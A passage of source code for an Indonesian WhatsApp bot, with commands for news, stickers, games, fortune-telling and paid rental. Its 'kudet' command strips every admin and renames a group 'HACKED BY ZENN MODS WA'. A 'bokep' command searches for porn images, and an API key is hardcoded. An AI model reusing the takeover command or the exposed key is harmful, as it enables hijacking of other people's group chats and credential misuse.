teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case "kontan-news":
if (isBan) return m.reply('*Lu Di Ban Owner*')
KontanNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case "merdeka-news":
if (isBan) return m.reply('*Lu Di Ban Owner*')
MerdekaNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case "jalantikus-meme":
var reis = await JalanTikusMeme()
teks = ""
teks += "Jalan Tikus Meme\n\n"
teks += `Source: ${reis}`
teks += ""
haikal.sendMessage(m.chat, { image : { url : reis }, caption: teks }, { quoted : hw })
break
//=================================================//
case 'tagall': {
if (!m.isGroup) return
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
haikal.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted : hw })
}
break
//=================================================//
case'demoteall':
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.groupParticipantsUpdate(from, mems, 'demote')
break
//=================================================//
case'promoteall':
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.groupParticipantsUpdate(from, mems, 'promote')
break
case 'tutorial': {
 m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
Tutorial Run Via Panel
https://youtu.be/rqqxkI4P8YY`)
}
break
//=================================================//
case 'infoamgeekz': {
 if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
haikal.sendMessage(from, { text : `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

📮 _*Syarat & Ketentuan*_

1. _Fitur lupa password sudah bisa digunakan jadi pastikan email aktif kalian sudah di tambahkan di panel kami._
2. _Selalu backup data_
3. _Jangan beritahukan user password kepada orang lain ( kami tidak bertanggung jawab dengan hal ini )_

_*sebelumnya kami mengalami kasus dimana user kami menjual akunnya ke orang lain dan selang beberapa hari meminta kami untuk reset password hal ini membuat nama panel kami dibilang scam untuk menanggulangi hal ini kami tidak akan lagi membantu melakukan reset password.*` , mentions: participants.map(a => a.id)}, {quoted : hw})
}
break
//=================================================//
case 'redemcode': {
 if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
haikal.sendMessage(from, { text : `*CARA MASUKAN KODE REDDEM AMGEEKZ*
- _TEKAN ICON KOIN/SALDO DIATAS_
- _PILIH KODE REDDEM_
- _MASUKAN KODE YANG DI KIRIM ADMIN_
- _TEKAN REDDEM_

*CREATE SERVER DI AMGEEKZ PANEL*
- _TEKAN POJOK KIRI ATAS_
- _PILIH SERVER_
- _TEKAN CREATE SERVER_
- _MASUKAN NAMA_
- _SOFTWARE/GAMES : NODEJS_
- _SPECIFICATION : NODEJS_
- _NODE : PILIH SERVER YANG DI INGINKAN_
- _PILIH PAKET_
- _TEKAN MANAGE_` , mentions: participants.map(a => a.id)}, {quoted : hw})
}
break
//=================================================//
case 'kalkulator': {
if (args.length < 1) return m.reply(`*Example :*\n${prefix}kalkulator 2 * 5\n\n*List Bilangan :*\n•> Kali : *\n•> Bagi : /\n•> Tambah : +\n•> Kurang : -`)
let qsd = args.join(" ")
if (typeof mathjs.evaluate(qsd) !== 'number') {
m.reply('Error')
} else {
m.reply(`\`\`\`「 Kalkulator 」\`\`\`\n\n*•> Hitung :* ${qsd}\n*•> Hasil :* ${mathjs.evaluate(qsd.replace(/×/g, "*").replace(/x/g, "*").replace(/÷/g, "/"))}`)
}
}
break
//=================================================//
case 'google': {
 if (!text) throw `Example : ${prefix + command} fatih arridho`
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
m.reply(teks)
})
}
break
//=================================================//
case 'bokep': {
 if (!text) throw `Example : ${prefix + command} indo`
let gis = require('g-i-s')
gis(text, async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
haikal.sendMessage(from, {image: { url: images },
caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`},{quoted : hw})
})
}
break
//=================================================//
case 'couple': {
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, { image: { url: random.male }, caption: `Couple Male` }, {quoted : hw})
haikal.sendMessage(from, { image: { url: random.female }, caption: `Couple Female` }, {quoted : hw})
}
break
//=================================================//
case 'coffe': case 'kopi': {
haikal.sendMessage(from, {image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`},{quoted : hw})
}
break
//=================================================//
case 'getname': {
if (!isCreator) return m.reply(`*khusus Premium*`)
if (qtod === "true") {
namenye = await haikal.getName(m.quoted.sender)
m.reply(namenye)
} else if (qtod === "false") {
haikal.sendMessage(from, {text:"Reply orangnya"}, {quoted : hw})
}
}
break
//=================================================//
case 'getpic': {
if (!isCreator) return m.reply(`*khusus Premium*`)
if (qtod === "true") {
try {
pporg = await haikal.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
haikal.sendMessage(from, { image : { url : pporg }, caption:`Done` }, {quoted : hw})
} else if (qtod === "false") {
try {
pporgs = await haikal.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
haikal.sendMessage(from, { image : { url : pporgs }, caption:`Done` }, {quoted : hw})
}
}
break
//=================================================//
case 'sewa':
if (isBan) return m.reply('*Lu Di Ban Owner*')
m.reply(`¥ *Price Sewa Bot Shekai* €

🔏 3 hari = 10k
🔏 1 minggu = 15k
🔏 2 minggu = 25k
🔏 1 bulan = 40k

Untuk Melanjutkan Sewa Silahkan Ketik Contoh Di bawah
*Contoh => sewabot 1 minggu`)
break

case 'sewabot':
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (!text) return m.reply(`*Contoh* :\n#sewabot 1 minggu `)
let cret = await haikal.groupCreate(args.join(" "), [])
let response = await haikal.groupInviteCode(cret.id)
haikal.sendMessage(sender, { text: `「 *Create Group Sewa* 」

Sewa Bot Selama *${text}* Sedang Dalam Prosess Silahkan Masuk Melalui Link Group Yang Sudah Di Sediakan..

_▸ Owner : ${botname}
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_https://chat.whatsapp.com/${response}
`, m})
m.reply('pesan dan link group khusus sudah terkirim di chat privasi anda')
break
//=================================================//
case 'sticker': case 's': case 'stickergif': case 'sgif': {
 if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await haikal.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await haikal.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
//=================================================//
case 'emojimix': { 
if (isBan) return m.reply('*Lu Di Ban Owner*')
 let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'emojimix2': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'kudet': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.groupUpdateSubject(from, `HACKED BY ZENN MODS WA`)
haikal.groupParticipantsUpdate(from, mems, 'demote')
 }
 break
 //=================================================//
 case "darkjoke": case "darkjokes":
 var ress = await Darkjokes()
teks = "*Darkjokes*"
haikal.sendMessage(m.chat, { image : { url : ress }, caption: teks }, { quoted : hw })
break
//=================================================//
case 'family100': {
 if ('family100'+from in _family100) {
 m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
 throw false
 }
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
 let random = anu[Math.floor(Math.random() * anu.length)]
 let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
 _family100['family100'+from] = {
 id: 'family100'+from,
 pesan: await haikal.sendText(from, hasil, m),
 ...random,
 terjawab: Array.from(random.jawaban, () => false),
 hadiah: 6,
 }
}
break
//=================================================//
case 'tebak': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
 if (args[0] === "lagu") {
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 let msg = await haikal.sendMessage(from, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, {quoted : hw})
 haikal.sendText(from, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
 tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lagu`},{quoted : hw}) 
 delete tebaklagu[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'gambar') {
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 haikal.sendImage(from, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
 tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak gambar`}, {quoted : hw}) 
 delete tebakgambar[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kata') {
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 haikal.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kata` }, {quoted : hw}) 
 delete tebakkata[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kalimat') {
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 haikal.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kalimat`}, {quoted : hw}) 
 delete tebakkalimat[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lirik') {
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 haikal.sendText(from, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
 tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lirik`} , {quoted : hw}) 
 delete tebaklirik[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lontong') {
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 haikal.sendText(from, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
 caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
 })
 await sleep(60000)
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption:`Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lontong`}, {quoted : hw}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
 }
 }
}
break
//=================================================//
case 'kuismath': case 'math': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let { genMath, modes } = require('./src/math')
 if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
 let result = await genMath(text.toLowerCase())
 haikal.sendText(from, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
 kuismath[m.sender.split('@')[0]] = result.jawaban
 })
 await sleep(result.waktu)
 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
 delete kuismath[m.sender.split('@')[0]]
 }
}
break
//=================================================//
case 'ttc': case 'ttt': case 'tictactoe': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 let TicTacToe = require("./baseikal/lib/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
m.reply('Partner ditemukan!')
room.o = from
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await haikal.sendText(room.x, str, m, { mentions: parseMention(str) } )
await haikal.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: from,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
this.game[room.id] = room
}
}
break
//=================================================//
case 'delttc': case 'delttt': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
if (!roomnya) throw `Kamu sedang tidak berada di room tictactoe !`
delete this.game[roomnya.id]
m.reply(`Berhasil delete session room tictactoe !`)
}
break
//=================================================//
case 'suitpvp': case 'suit': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, from, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await haikal.sendText(from, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) haikal.sendText(from, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break
//=================================================//
case 'artimimpi': case 'tafsirmimpi': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} belanja`
 let anu = await primbon.tafsir_mimpi(text)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}
break
//=================================================//
case 'ramalanjodoh': case 'ramaljodoh': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} ZENN MODS WA, 7, 7, 2005, Putri, 16, 11, 2004`
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artinama': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} ZENN MODS WA Hw`
 let anu = await primbon.arti_nama(text)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'kecocokannama': case 'cocoknama': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} ZENN MODS WA, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break
//=================================================//
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} ZENN MODS WA|Putri`
 let [nama1, nama2] = text.split`|`
 let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendImage(from,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
case 'jadianpernikahan': case 'jadiannikah': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
}
break
//=================================================//
case 'sifatusaha': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}
break
//=================================================//
case 'rejeki': case 'rezeki': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'pekerjaan': case 'kerja': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.ramalan_nasib(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break
//=================================================//
case 'potensipenyakit': case 'penyakit': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artitarot': case 'tarot': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendImage(from, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'fengshui': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} ZENN MODS WA, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
 let [nama, gender, tahun] = text.split`,`
 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
 if (anu.status == false) return m.reply(anu.message)
